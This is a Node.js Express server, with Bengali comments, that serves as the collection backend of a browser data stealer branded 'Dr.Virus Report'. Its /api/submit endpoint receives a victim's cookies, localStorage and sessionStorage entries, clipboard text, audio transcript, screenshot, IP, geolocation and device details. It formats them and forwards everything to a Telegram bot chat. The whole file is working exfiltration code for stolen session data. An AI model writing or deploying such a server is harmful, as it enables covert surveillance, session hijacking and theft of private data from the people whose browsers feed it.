const express = require('express');
const cors = require('cors');
const axios = require('axios');

const app = express();
app.use(cors());
app.use(express.json({ limit: '50mb' }));

const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '';
const DEFAULT_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '';

// টেলিগ্রামে মেসেজ পাঠানোর ফাংশন
async function sendToTelegram(chatId, text, photo = null) {
    if (!BOT_TOKEN) {
        console.error('TELEGRAM_BOT_TOKEN সেট করা নেই');
        return false;
    }
    try {
        if (photo) {
            // ফটো পাঠানোর জন্য (স্ক্রিনশট)
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('photo', photo, 'screenshot.jpg');
            formData.append('caption', text.substring(0, 1024));
            await axios.post(url, formData, {
                headers: { 'Content-Type': 'multipart/form-data' }
            });
        } else {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            await axios.post(url, {
                chat_id: chatId,
                text: text,
                parse_mode: 'HTML'
            });
        }
        return true;
    } catch (error) {
        console.error('টেলিগ্রামে পাঠাতে ব্যর্থ:', error.message);
        return false;
    }
}

// ডেটা গ্রহণ ও ফরওয়ার্ড করার API
app.post('/api/submit', async (req, res) => {
    try {
        const { chatId, data } = req.body;
        const targetChatId = chatId || DEFAULT_CHAT_ID;

        if (!targetChatId) {
            return res.status(400).json({ error: 'chatId প্রয়োজন' });
        }

        // ডেটা ফরম্যাট করে টেলিগ্রাম মেসেজ তৈরি
        let message = `<b>🧪 Dr.Virus Report</b>\n`;
        message += `<b>⏱️ Time:</b> ${new Date().toISOString()}\n\n`;

        // ব্রাউজার ইনফো
        if (data.browser) {
            message += `<b>🌐 Browser Info</b>\n`;
            message += `User-Agent: <code>${data.browser.userAgent || 'N/A'}</code>\n`;
            message += `Platform: ${data.browser.platform || 'N/A'}\n`;
            message += `Language: ${data.browser.language || 'N/A'}\n`;
            message += `Screen: ${data.browser.screenWidth || 'N/A'}x${data.browser.screenHeight || 'N/A'}\n`;
            message += `Timezone: ${data.browser.timezone || 'N/A'}\n\n`;
        }

        // জিওলোকেশন
        if (data.geo) {
            message += `<b>📍 Location</b>\n`;
            message += `IP: ${data.geo.ip || 'N/A'}\n`;
            message += `Country: ${data.geo.country || 'N/A'}\n`;
            message += `City: ${data.geo.city || 'N/A'}\n`;
            message += `ISP: ${data.geo.isp || 'N/A'}\n\n`;
        }

        // সিস্টেম ইনফো
        if (data.system) {
            message += `<b>💻 System</b>\n`;
            message += `CPU Cores: ${data.system.cores || 'N/A'}\n`;
            message += `Memory: ${data.system.memory || 'N/A'} MB\n`;
            if (data.system.battery !== undefined) {
                message += `Battery: ${data.system.battery}%\n`;
            }
            message += `\n`;
        }

        // কুকি
        if (data.cookies && data.cookies.length > 0) {
            message += `<b>🍪 Cookies (${data.cookies.length})</b>\n`;
            data.cookies.slice(0, 15).forEach(c => {
                message += `${c.name}=${c.value.substring(0, 40)}...\n`;
            });
            if (data.cookies.length > 15) message += `... এবং আরও ${data.cookies.length - 15}টি\n`;
            message += `\n`;
        }

        // লোকাল স্টোরেজ
        if (data.localStorage && data.localStorage.length > 0) {
            message += `<b>📦 Local Storage (${data.localStorage.length})</b>\n`;
            data.localStorage.slice(0, 10).forEach(item => {
                message += `${item.key}=${item.value.substring(0, 40)}...\n`;
            });
            if (data.localStorage.length > 10) message += `... এবং আরও ${data.localStorage.length - 10}টি\n`;
            message += `\n`;
        }

        // সেশন স্টোরেজ
        if (data.sessionStorage && data.sessionStorage.length > 0) {
            message += `<b>📂 Session Storage (${data.sessionStorage.length})</b>\n`;
            data.sessionStorage.slice(0, 10).forEach(item => {
                message += `${item.key}=${item.value.substring(0, 40)}...\n`;
            });
            if (data.sessionStorage.length > 10) message += `... এবং আরও ${data.sessionStorage.length - 10}টি\n`;
            message += `\n`;
        }

        // ক্লিপবোর্ড
        if (data.clipboard) {
            message += `<b>📋 Clipboard</b>\n`;
            message += `<code>${data.clipboard.substring(0, 500)}</code>\n\n`;
        }

        // অডিও ট্রান্সক্রিপ্ট (যদি থাকে)
        if (data.audioTranscript) {
            message += `<b>🎤 Audio Transcript</b>\n`;
            message += `<code>${data.audioTranscript.substring(0, 500)}</code>\n\n`;
        }

        // ডেটা সাইজ লিমিট (4096 চর)
        if (message.length > 4090) {
            message = message.substring(0, 4000) + '\n... (ট্রাঙ্কেটেড)';
        }

        // স্ক্রিনশট পাঠান (যদি থাকে)
        let photo = null;
        if (data.screenshot) {
            photo = Buffer.from(data.screenshot.split(',')[1], 'base64');
        }

        const sent = await sendToTelegram(targetChatId, message, photo);
        if (sent) {
            res.json({ success: true, message: 'টেলিগ্রামে পাঠানো হয়েছে' });
        } else {
            res.status(500).json({ error: 'টেলিগ্রামে পাঠাতে ব্যর্থ' });
        }
    } catch (error) {
        console.error(error);
        res.status(500).json({ error: error.message });
    }
});

// হেলথ চেক
app.get('/api/health', (req, res) => {
    res.json({ status: 'ok', botTokenSet: !!BOT_TOKEN });
});

module.exports = app;
